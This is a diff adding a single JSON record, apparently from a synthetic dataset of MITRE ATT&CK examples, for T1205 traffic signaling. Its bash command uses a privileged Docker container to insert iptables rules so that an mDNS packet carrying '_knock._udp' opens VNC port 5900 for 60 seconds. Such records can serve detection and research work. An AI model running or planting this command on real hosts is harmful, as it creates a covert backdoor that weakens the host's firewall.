@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 5353 -m string --string '_knock._udp' --algo bm -j LOG --log-prefix 'T1205_MDNS_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 5353 -m string --string '_knock._udp' --algo bm -m recent --name t1205_mdns --set && iptables -I INPUT -p tcp --dport 5900 -m recent --name t1205_mdns --rcheck --seconds 60 --reap -j ACCEPT\"",
+  "explanation": "Uses mDNS payload containing a service label '_knock._udp' on UDP/5353 as the signal. Logs the anomalous query and grants temporary access to TCP/5900 (VNC) for the signaling IP.",
+  "rationale_steps": [
+    "Run iptables alterations via Docker in the host net namespace.",
+    "Identify an unusual mDNS service string as a traffic signal.",
+    "Open TCP/5900 for 60 seconds to the IP that signaled."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-27d4d7d8",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
